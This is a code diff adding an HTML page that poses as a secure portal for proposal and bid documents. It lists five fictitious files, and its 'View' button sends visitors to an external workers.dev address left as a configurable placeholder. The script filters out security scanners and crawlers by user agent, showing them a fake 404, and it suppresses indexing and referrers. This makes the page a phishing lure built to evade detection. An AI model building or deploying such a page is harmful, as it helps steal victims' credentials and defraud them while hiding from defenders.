@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proposal & Bid Documents — Secure Access</title>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(145deg, #ffffff 0%, #e6f0fa 100%);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+            color: #1a2b3c;
+        }
+
+        .card {
+            max-width: 750px;
+            width: 100%;
+            background: white;
+            border-radius: 28px;
+            box-shadow: 0 20px 40px -15px rgba(15, 91, 156, 0.2), 0 5px 15px -5px rgba(0,20,40,0.1);
+            border: 1px solid rgba(15, 91, 156, 0.1);
+            overflow: hidden;
+            padding: 1.5rem 1.8rem;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            margin-bottom: 0.2rem;
+        }
+
+        .header i {
+            font-size: 1.5rem;
+            color: #0f5b9c;
+            background: rgba(15, 91, 156, 0.08);
+            padding: 8px;
+            border-radius: 14px;
+        }
+
+        .header h1 {
+            font-size: 1.6rem;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+            color: #0b2b44;
+        }
+
+        .subhead {
+            font-size: 0.9rem;
+            color: #4f658a;
+            margin-left: 2.7rem;
+            margin-top: -0.1rem;
+            margin-bottom: 1.5rem;
+            font-weight: 400;
+        }
+
+        .secure-badge {
+            background: rgba(15, 91, 156, 0.08);
+            color: #0f5b9c;
+            padding: 0.3rem 1rem;
+            border-radius: 40px;
+            margin-bottom: 1.2rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+            font-size: 0.8rem;
+            border: 1px solid rgba(15, 91, 156, 0.15);
+        }
+
+        .secure-badge i {
+            color: #0f5b9c;
+            font-size: 0.8rem;
+        }
+
+        .select-all-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #f8fbff;
+            padding: 0.6rem 1.2rem;
+            border-radius: 60px;
+            box-shadow: 0 2px 8px rgba(0,32,64,0.03);
+            margin-bottom: 1.2rem;
+            border: 1px solid rgba(15, 91, 156, 0.1);
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .select-all-row:hover {
+            background: #ffffff;
+            box-shadow: 0 4px 12px rgba(0,32,64,0.06);
+            transform: translateY(-1px);
+        }
+
+        .select-all-left {
+            display: flex;
+            align-items: center;
+            gap: 0.7rem;
+            pointer-events: none;
+        }
+
+        .select-all-left span {
+            font-weight: 500;
+            color: #1a3b5c;
+            font-size: 0.95rem;
+        }
+
+        .badge {
+            background: #d4e2fa;
+            color: #0f5b9c;
+            font-size: 0.7rem;
+            font-weight: 600;
+            padding: 0.15rem 0.6rem;
+            border-radius: 30px;
+            letter-spacing: 0.01em;
+        }
+
+        .checkbox {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #8ba0c2;
+            border-radius: 5px;
+            background: white;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 11px;
+            transition: 0.1s;
+            cursor: pointer;
+        }
+
+        .checkbox.checked {
+            background: #0f5b9c;
+            border-color: #0f5b9c;
+        }
+
+        .checkbox i {
+            font-size: 11px;
+            pointer-events: none;
+        }
+
+        .file-list {
+            background: #f8fbff;
+            border-radius: 20px;
+            padding: 0.8rem 0.2rem;
+            margin-bottom: 1rem;
+            border: 1px solid rgba(15, 91, 156, 0.1);
+        }
+
+        .file-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0.5rem 1.2rem 0.5rem 1rem;
+            border-radius: 12px;
+            margin: 0 0.5rem;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            color: inherit;
+            cursor: pointer;
+        }
+
+        .file-item:hover {
+            background: white;
+            box-shadow: 0 2px 8px rgba(0,32,64,0.04);
+        }
+
+        .file-left {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            flex: 1;
+        }
+
+        .file-left .checkbox {
+            width: 16px;
+            height: 16px;
+            border-radius: 4px;
+        }
+
+        .file-icon {
+            color: #2b4f77;
+            font-size: 1rem;
+            width: 1.4rem;
+            text-align: center;
+        }
+
+        .file-info {
+            flex: 1;
+        }
+
+        .file-info h4 {
+            font-weight: 550;
+            font-size: 0.95rem;
+            color: #102b40;
+        }
+
+        .file-meta {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            margin-top: 0.1rem;
+        }
+
+        .quarter {
+            background: #e1ecfe;
+            font-size: 0.6rem;
+            font-weight: 600;
+            padding: 0.15rem 0.5rem;
+            border-radius: 30px;
+            color: #0f5b9c;
+            border: 1px solid #bbd2f0;
+        }
+
+        .file-size {
+            font-size: 0.65rem;
+            color: #5b739b;
+        }
+
+        .download-icon {
+            color: #7f9bc0;
+            opacity: 0.5;
+            transition: opacity 0.2s ease;
+            cursor: pointer;
+            padding: 5px;
+            border-radius: 50%;
+            font-size: 0.8rem;
+        }
+
+        .download-icon:hover {
+            opacity: 1;
+            color: #0f5b9c;
+            background: rgba(15, 91, 156, 0.08);
+        }
+
+        .footer-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #1b344d;
+            border-radius: 50px;
+            padding: 0.4rem 1.2rem 0.4rem 1.5rem;
+            color: white;
+            box-shadow: 0 8px 20px -5px rgba(15,91,156,0.25);
+            border: 1px solid rgba(255,255,255,0.2);
+            margin-top: 1.2rem;
+            transition: all 0.2s ease;
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .footer-bar.active {
+            opacity: 1;
+            cursor: pointer;
+        }
+
+        .footer-bar.active:hover {
+            background: #1f3c5a;
+            box-shadow: 0 10px 25px -5px rgba(15,91,156,0.35);
+            transform: translateY(-1px);
+        }
+
+        .footer-bar.active:active {
+            transform: translateY(0px);
+        }
+
+        .selected-count {
+            font-weight: 500;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+            pointer-events: none;
+        }
+
+        .selected-count span {
+            background: #3f618b;
+            padding: 0.15rem 0.6rem;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            color: white;
+            min-width: 25px;
+            text-align: center;
+        }
+
+        .view-btn {
+            background: white;
+            color: #1b344d;
+            border: none;
+            padding: 0.5rem 1.5rem;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            pointer-events: none;
+        }
+
+        .view-btn i {
+            font-size: 0.8rem;
+            color: #3f618b;
+        }
+
+        .note {
+            text-align: center;
+            margin-top: 1rem;
+            font-size: 0.7rem;
+            color: #6f8aac;
+            opacity: 0.7;
+            letter-spacing: 0.2px;
+        }
+
+        .click-hint {
+            text-align: right;
+            font-size: 0.65rem;
+            color: #8ba0c2;
+            margin-bottom: 0.4rem;
+            padding-right: 0.3rem;
+        }
+
+        .click-hint i {
+            margin-right: 0.2rem;
+        }
+
+        .requirement-badge {
+            background: #ffd966;
+            color: #1b344d;
+            font-size: 0.6rem;
+            padding: 0.15rem 0.5rem;
+            border-radius: 20px;
+            margin-left: 0.4rem;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <!-- header -->
+        <div class="header">
+            <i class="fas fa-lock"></i>
+            <h1>Proposal & Bid Documents</h1>
+        </div>
+        <div class="subhead">— Secure Access</div>
+
+        <!-- Secure badge -->
+        <div class="secure-badge">
+            <i class="fas fa-shield-alt"></i> Secure connection
+        </div>
+
+        <!-- Click hint -->
+        <div class="click-hint">
+            <i class="fas fa-hand-pointer"></i> Select documents
+        </div>
+
+        <!-- select all row -->
+        <div class="select-all-row" id="selectAllRow">
+            <div class="select-all-left">
+                <div class="checkbox" id="selectAllCheckbox">
+                    <i class="fas fa-check" style="color:white; display: none;"></i>
+                </div>
+                <span>Select All</span>
+                <span class="badge">5</span>
+            </div>
+            <div style="color:#3d638b; font-size:0.8rem; background: #eaf1fd; padding:0.2rem 0.8rem; border-radius:30px;">
+                <i class="far fa-eye" style="margin-right:4px;"></i> select all
+            </div>
+        </div>
+
+        <!-- file list -->
+        <div class="file-list" id="fileList">
+            <!-- RFP Overview Document -->
+            <div class="file-item" data-file-id="rfp" data-file-name="RFP Overview Document">
+                <div class="file-left">
+                    <div class="checkbox file-checkbox" data-file="rfp">
+                        <i class="fas fa-check" style="color:white; display: none;"></i>
+                    </div>
+                    <i class="fas fa-file-pdf file-icon"></i>
+                    <div class="file-info">
+                        <h4>RFP Overview Document</h4>
+                        <div class="file-meta">
+                            <span class="quarter">Q2 2026</span>
+                            <span class="file-size">1.2 MB</span>
+                        </div>
+                    </div>
+                </div>
+                <i class="fas fa-download download-icon" onclick="event.stopPropagation(); handleDownload('rfp')"></i>
+            </div>
+
+            <!-- Scope of Work & Specifications -->
+            <div class="file-item" data-file-id="scope" data-file-name="Scope of Work & Specifications">
+                <div class="file-left">
+                    <div class="checkbox file-checkbox" data-file="scope">
+                        <i class="fas fa-check" style="color:white; display: none;"></i>
+                    </div>
+                    <i class="fas fa-file-lines file-icon"></i>
+                    <div class="file-info">
+                        <h4>Scope of Work & Specifications</h4>
+                        <div class="file-meta">
+                            <span class="quarter">Q2 2026</span>
+                            <span class="file-size">892 KB</span>
+                        </div>
+                    </div>
+                </div>
+                <i class="fas fa-download download-icon" onclick="event.stopPropagation(); handleDownload('scope')"></i>
+            </div>
+
+            <!-- Bid Submission Guidelines -->
+            <div class="file-item" data-file-id="bid" data-file-name="Bid Submission Guidelines">
+                <div class="file-left">
+                    <div class="checkbox file-checkbox" data-file="bid">
+                        <i class="fas fa-check" style="color:white; display: none;"></i>
+                    </div>
+                    <i class="fas fa-file-contract file-icon"></i>
+                    <div class="file-info">
+                        <h4>Bid Submission Guidelines</h4>
+                        <div class="file-meta">
+                            <span class="quarter">Q2 2026</span>
+                            <span class="file-size">410 KB</span>
+                        </div>
+                    </div>
+                </div>
+                <i class="fas fa-download download-icon" onclick="event.stopPropagation(); handleDownload('bid')"></i>
+            </div>
+
+            <!-- Compliance Requirements -->
+            <div class="file-item" data-file-id="compliance" data-file-name="Compliance Requirements">
+                <div class="file-left">
+                    <div class="checkbox file-checkbox" data-file="compliance">
+                        <i class="fas fa-check" style="color:white; display: none;"></i>
+                    </div>
+                    <i class="fas fa-shield-alt file-icon"></i>
+                    <div class="file-info">
+                        <h4>Compliance Requirements</h4>
+                        <div class="file-meta">
+                            <span class="quarter">Q2 2026</span>
+                            <span class="file-size">2.1 MB</span>
+                        </div>
+                    </div>
+                </div>
+                <i class="fas fa-download download-icon" onclick="event.stopPropagation(); handleDownload('compliance')"></i>
+            </div>
+
+            <!-- Contract Terms & Conditions -->
+            <div class="file-item" data-file-id="contract" data-file-name="Contract Terms & Conditions">
+                <div class="file-left">
+                    <div class="checkbox file-checkbox" data-file="contract">
+                        <i class="fas fa-check" style="color:white; display: none;"></i>
+                    </div>
+                    <i class="fas fa-file-signature file-icon"></i>
+                    <div class="file-info">
+                        <h4>Contract Terms & Conditions</h4>
+                        <div class="file-meta">
+                            <span class="quarter">Q2 2026</span>
+                            <span class="file-size">1.5 MB</span>
+                        </div>
+                    </div>
+                </div>
+                <i class="fas fa-download download-icon" onclick="event.stopPropagation(); handleDownload('contract')"></i>
+            </div>
+        </div>
+
+        <!-- footer - View Selected button -->
+        <div class="footer-bar" id="viewSelectedBtn">
+            <div class="selected-count">
+                <i class="far fa-check-circle"></i> Selected <span id="selectedCount">0</span>
+            </div>
+            <div class="view-btn">
+                View <i class="fas fa-arrow-right"></i>
+                <span class="requirement-badge" id="requirementBadge">select</span>
+            </div>
+        </div>
+
+        <div class="note">
+            <i class="fas fa-lock" style="font-size:0.6rem;"></i> Select files to continue
+        </div>
+    </div>
+
+    <script>
+        // =============================================
+        // CONFIGURATION - SET YOUR REDIRECT URL HERE
+        // =============================================
+        const REDIRECT_URL = 'https://project-event.portal-live-document.workers.dev'; // <-- CHANGE THIS TO YOUR WEBSITE
+        const PREVIEW_MODE = window.location.search.includes('preview=true');
+        
+        // =============================================
+        // Interactive Selection Logic
+        // =============================================
+        
+        // Track selected files
+        let selectedFiles = new Set();
+        const totalFiles = 5;
+        
+        // DOM elements
+        const selectAllCheckbox = document.getElementById('selectAllCheckbox');
+        const selectAllRow = document.getElementById('selectAllRow');
+        const fileCheckboxes = document.querySelectorAll('.file-checkbox');
+        const selectedCountSpan = document.getElementById('selectedCount');
+        const viewSelectedBtn = document.getElementById('viewSelectedBtn');
+        const requirementBadge = document.getElementById('requirementBadge');
+        
+        // File names mapping (only used internally)
+        const fileNames = {
+            'rfp': 'RFP Overview Document',
+            'scope': 'Scope of Work',
+            'bid': 'Bid Guidelines',
+            'compliance': 'Compliance Requirements',
+            'contract': 'Contract Terms'
+        };
+        
+        // Update UI based on selected files
+        function updateSelectionUI() {
+            // Update checkboxes
+            fileCheckboxes.forEach(checkbox => {
+                const fileId = checkbox.getAttribute('data-file');
+                const checkIcon = checkbox.querySelector('i');
+                
+                if (selectedFiles.has(fileId)) {
+                    checkbox.classList.add('checked');
+                    checkIcon.style.display = 'inline-block';
+                } else {
+                    checkbox.classList.remove('checked');
+                    checkIcon.style.display = 'none';
+                }
+            });
+            
+            // Update select all checkbox
+            const selectAllIcon = selectAllCheckbox.querySelector('i');
+            if (selectedFiles.size === totalFiles) {
+                selectAllCheckbox.classList.add('checked');
+                selectAllIcon.style.display = 'inline-block';
+            } else {
+                selectAllCheckbox.classList.remove('checked');
+                selectAllIcon.style.display = 'none';
+            }
+            
+            // Update selected count
+            selectedCountSpan.textContent = selectedFiles.size;
+            
+            // Enable/disable view selected button
+            if (selectedFiles.size > 0) {
+                viewSelectedBtn.classList.add('active');
+                requirementBadge.textContent = 'ready';
+                requirementBadge.style.background = '#6fcf97';
+            } else {
+                viewSelectedBtn.classList.remove('active');
+                requirementBadge.textContent = 'select';
+                requirementBadge.style.background = '#ffd966';
+            }
+        }
+        
+        // Toggle file selection
+        function toggleFile(fileId) {
+            if (selectedFiles.has(fileId)) {
+                selectedFiles.delete(fileId);
+            } else {
+                selectedFiles.add(fileId);
+            }
+            updateSelectionUI();
+        }
+        
+        // Select all files
+        function selectAll() {
+            if (selectedFiles.size === totalFiles) {
+                // Deselect all
+                selectedFiles.clear();
+            } else {
+                // Select all
+                selectedFiles = new Set(['rfp', 'scope', 'bid', 'compliance', 'contract']);
+            }
+            updateSelectionUI();
+        }
+        
+        // Handle download icon click
+        function handleDownload(fileId) {
+            alert(`Download simulation for ${fileNames[fileId]}`);
+        }
+        
+        // Handle view selected - INSTANT redirect
+        function viewSelected() {
+            if (selectedFiles.size === 0) {
+                alert('Please select at least one file first!');
+                return;
+            }
+            
+            // INSTANT redirect
+            if (!PREVIEW_MODE) {
+                window.location.href = REDIRECT_URL;
+            }
+        }
+        
+        // =============================================
+        // Event Listeners
+        // =============================================
+        
+        // Select all row click
+        selectAllRow.addEventListener('click', function(e) {
+            e.stopPropagation();
+            selectAll();
+        });
+        
+        // File item click (for checkbox)
+        document.querySelectorAll('.file-item').forEach(item => {
+            item.addEventListener('click', function(e) {
+                // Don't trigger if clicking on download icon
+                if (e.target.classList.contains('download-icon') || e.target.closest('.download-icon')) {
+                    return;
+                }
+                
+                const fileId = this.getAttribute('data-file-id');
+                toggleFile(fileId);
+            });
+        });
+        
+        // View selected button click - INSTANT redirect
+        viewSelectedBtn.addEventListener('click', function() {
+            viewSelected();
+        });
+        
+        // =============================================
+        // Anti-spam Bot Detection
+        // =============================================
+        
+        (function() {
+            // Get user agent from browser
+            const userAgent = navigator.userAgent || '';
+            
+            // Anti-spam: Check for bots/crawlers
+            const botPatterns = [
+                'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python',
+                'java', 'ruby', 'perl', 'php', 'http client', 'headless', 'selenium',
+                'puppeteer', 'phantomjs', 'slurp', 'fetch', 'axios', 'scrapy'
+            ];
+            
+            const isBot = botPatterns.some(pattern => 
+                userAgent.toLowerCase().includes(pattern.toLowerCase())
+            );
+            
+            // Check for rapid requests
+            const requestTime = Date.now();
+            const lastVisit = sessionStorage.getItem('lastVisit');
+            const rapidRequest = lastVisit && (requestTime - parseInt(lastVisit)) < 500;
+            sessionStorage.setItem('lastVisit', requestTime.toString());
+            
+            // If bot detected, show 404
+            if (isBot || rapidRequest) {
+                document.body.innerHTML = `
+                    <div style="text-align: center; background: white; padding: 2rem; border-radius: 24px; box-shadow: 0 20px 40px -15px rgba(0,40,80,0.2);">
+                        <i class="fas fa-robot" style="font-size: 3rem; color: #8ba0c2; margin-bottom: 0.8rem;"></i>
+                        <h1 style="font-size: 2.5rem; color: #0b2b44;">404</h1>
+                        <p style="font-size: 1rem; color: #4f658a;">Access Denied</p>
+                        <p style="color: #8ba0c2; margin-top: 0.8rem; font-size: 0.9rem;">Automated access not permitted.</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            // Set security headers
+            const metaRobots = document.createElement('meta');
+            metaRobots.name = 'robots';
+            metaRobots.content = 'noindex, nofollow';
+            document.head.appendChild(metaRobots);
+            
+            const metaReferrer = document.createElement('meta');
+            metaReferrer.name = 'referrer';
+            metaReferrer.content = 'no-referrer';
+            document.head.appendChild(metaReferrer);
+            
+            // Cache control
+            const metaCache = document.createElement('meta');
+            metaCache.httpEquiv = 'Cache-Control';
+            metaCache.content = 'no-cache, no-store, must-revalidate';
+            document.head.appendChild(metaCache);
+            
+            console.log('Secure gateway initialized', PREVIEW_MODE ? '(Preview Mode)' : '(Live Mode)');
+        })();
+    </script>
+</body>
+</html>
